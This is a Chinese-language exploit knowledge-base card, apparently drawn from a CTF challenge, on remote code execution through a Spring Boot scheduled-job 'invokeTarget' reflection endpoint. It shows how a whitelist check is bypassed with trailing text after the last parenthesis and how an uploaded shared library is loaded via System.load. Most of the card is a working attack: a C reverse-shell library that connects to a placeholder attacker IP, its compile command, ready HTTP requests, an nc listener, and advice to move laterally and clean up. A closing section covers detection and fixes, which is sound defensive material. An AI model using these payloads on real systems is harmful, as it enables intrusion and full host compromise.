---
id: web-java-rce-job-invoketarget-whitelist-suffix-system-load-so
title: 定时任务 invokeTarget 反射调用 + 白名单尾部截断绕过：上传 .so 后 System.load 加载执行
type: scenario
domain: web
path: web/java/rce
technique: job-invoketarget-whitelist-suffix-system-load-native-so
tags:
- java
- spring-boot
- scheduler
- invoke-target
- reflection
- whitelist-bypass
- blacklist-bypass
- system-load
- native-library
- file-upload
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T12:54:35+08:00'
  notes: 已对照原文 web-jaba_ez 段与 img/05-06 核对：job/add 与 job/run 反射调用、黑名单/白名单 contains、lastIndexOf(')') 尾部截断、System.load 上传 .so、反弹 shell 均一致；修正黑名单第三项为原文的 org.yaml.snakeyaml（原卡写成 org.yaml）；未在真实环境复跑。
url: /docs/web/java/rce/web-java-rce-job-invoketarget-whitelist-suffix-system-load-so/
draft: false
kb_aliases:
- invokeTarget 白名单绕过
- com.jabaez.FLAG 绕过
- 定时任务反射调用 RCE
- System.load 加载 .so
- 上传恶意原生库 RCE
- job add job run 任意方法调用
---

## 一句话结论

Spring Boot 应用的 `/api/job/add` 保存 `invokeTarget`，`/api/job/run/{jobName}` 按 `className#method(params)` 反射调用；虽然接口用黑名单 + 白名单子串过滤，但解析器只取最后一个 `)` 之前的内容，攻击者在 `)` 后追加白名单要求的 `com.jabaez.FLAG` 即可让检查通过、实际仍调用 `java.lang.System#load('/tmp/uploads/rce.so')`；配合任意文件上传写入恶意 `.so`，加载时构造函数执行，获得反向 Shell。

## 原理

- **入口与反射**：`POST /api/job/add` 把 `ScheduledJob` 放入内存 Map；`POST /api/job/run/{jobName}` 取出后调用 `invokeMethod(job.getInvokeTarget())`。`invokeMethod` 找到 `#`，左侧为 `className`，右侧为 `methodName(params)`；用 `Class.forName` 加载类，按 String/Integer/Boolean 解析参数类型，先 `getMethod` 后 `getDeclaredMethod + setAccessible(true)`，静态方法直接 `invoke(null, ...)`，否则 `newInstance()` 后调用。
- **过滤**：
  - 黑名单 `{"java.net.URL","javax.naming.InitialContext","org.yaml.snakeyaml","org.springframework","org.apache","rmi","ldap","ldaps","http","https"}`，对 `invokeTarget.toLowerCase()` 做 `contains`；
  - 白名单 `{"com.jabaez.FLAG"}`，要求原始字符串包含该子串。
- **尾部截断绕过**：解析参数时 `paramStart = indexOf('(')`、`paramEnd = lastIndexOf(')')`，`paramStr = substring(paramStart + 1, paramEnd)`；最后一个 `)` 之后的任何字符都被丢弃，不参与类名/方法/参数解析。把 `com.jabaez.FLAG` 放在 `)` 后面，白名单 `contains` 成立，而真正执行的目标仍是 `java.lang.System#load('/tmp/uploads/rce.so')`。
- **黑名单为什么拦不住**：目标串 `java.lang.System#load(...)` 不含 URL/JNDI/SnakeYAML/Spring/Apache/协议等关键字；`System.load` 是 JDK 自带静态方法，参数正好是 String，解析器可直接传入。
- **上传配合**：`/api/upload` 接收 multipart 文件，取 `new File(originalFilename).getName()`，拒绝 `..`、`/`、`\` 和以 `.` 开头的名字，并用 canonical path 校验必须落在 `/tmp/uploads/` 内；但未限制扩展名/内容。上传 `rce.so` 后可预测绝对路径 `/tmp/uploads/rce.so`。
- **执行**：`System.load` 加载原生库时会执行其 `__attribute__((constructor))` 函数，攻击者在构造函数里建立 socket、`dup2` 到 0/1/2 并 `execve("/bin/sh")`，即得到反向 Shell；加载发生在应用进程内，权限与 Java 进程一致。

## 触发条件

- 应用暴露 `/api/job/add` 与 `/api/job/run/{jobName}`，且调用目标字符串可控（或存在默认/弱口令后台）。
- 过滤逻辑为“黑名单 + 白名单子串”，且解析器存在“最后一个 `)` 后内容被忽略”的截断。
- 存在可写目录的文件上传接口（本例 `/api/upload` 写 `/tmp/uploads/`），且允许 `.so` 等原生库文件。
- `System.load` 可加载该绝对路径（文件存在、架构匹配、进程有读权限）；Java 进程权限即获得的 Shell 权限。
- 若目标为 Windows，可改用 `.dll` 与 `System.load`（需架构匹配）。

## 利用步骤

1. 访问 `/api/server` 或源码确认 `uploadDir`、黑名单/白名单内容与 `invokeMethod` 解析逻辑。
2. 编写带构造函数反弹 Shell 的 C 代码，编译为共享库（`gcc -shared -fPIC rce.c -o rce.so`）。
3. 通过 `/api/upload` 上传 `rce.so`，响应返回绝对路径（本例 `/tmp/uploads/rce.so`）。
4. 向 `/api/job/add` 提交任务，`invokeTarget` 为 `java.lang.System#load('/tmp/uploads/rce.so')com.jabaez.FLAG`，`cronExpression` 任意。
5. 向 `/api/job/run/load` 触发任务；`System.load` 执行 `.so` 构造函数，攻击机监听端口收到 Shell。
6. 确认权限、主机信息后继续横向；清理上传文件与任务。

## PoC

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor))
void revshell() {
    const char* ip = "ATTACKER_IP";
    const int port = 1234;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) != 0) { close(sock); return; }
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
    close(sock);
}
```

```bash
gcc -shared -fPIC rce.c -o rce.so
```

```http
POST /api/upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="rce.so"
Content-Type: application/octet-stream

<rce.so 二进制>
------X--
```

```http
POST /api/job/add HTTP/1.1
Host: target
Content-Type: application/json

{"jobName":"load","invokeTarget":"java.lang.System#load('/tmp/uploads/rce.so')com.jabaez.FLAG","cronExpression":"* * * * *"}
```

```http
POST /api/job/run/load HTTP/1.1
Host: target
Content-Type: application/json
```

跳板机监听 `nc -lvnp 1234`，收到 Shell。

## 变体与关联

- 变体：把白名单标记放在 `)` 之后的任意位置；若解析器改为 `indexOf(')')`，可改用其他截断点（空格、注释、分号）。
- 变体：不用 `.so`，改调用其他未被黑名单覆盖的静态方法（如属性设置、文件写入、表达式类），或先上传 JSP/脚本到 Web 目录。
- 变体：若 `/job/add` 需登录，可结合弱口令/默认口令或后台越权；本例接口未鉴权。
- 关联：同挑战的 EL 注入利用 [[web-java-expression-invoketarget-whitelist-substring-elprocessor-el-rce]]；RuoYi 定时任务反射链 [[web-java-rce-ruoyi-job-invoke-target-reflection-snakeyaml]]；上传合法扩展名绕过 [[web-generic-file-upload-extension-zero-check]]。
- 边界：白名单使用精确类名/方法名校验、解析器不再忽略尾部字符、上传目录不可写或禁止原生库、`System.load` 被 SecurityManager 限制、架构不匹配时，利用失败。

## 检测与防御

- 检测：`invokeTarget` 中出现 `java.lang.System`、`load(`、`.so`/`.dll` 路径、`)` 后跟白名单字符串；`/api/job/add` 与 `/api/job/run` 短时间连续调用；`/tmp/uploads` 出现原生库文件；Java 进程加载非应用目录的 `.so`、派生 `sh` 子进程。
- 修复：不要用反射执行用户可控的方法字符串；改为服务端枚举的任务类型白名单（精确匹配类+方法）；白名单/黑名单在校验前先规范化并拒绝尾部多余字符。
- 加固：上传接口限制扩展名与内容（禁止 `.so`/`.dll`）、文件名由服务端生成；`/api/job/*` 强制鉴权与权限校验；以低权限运行 Java 进程；监控进程的 `System.load`/`dlopen` 行为与新出现的共享库。
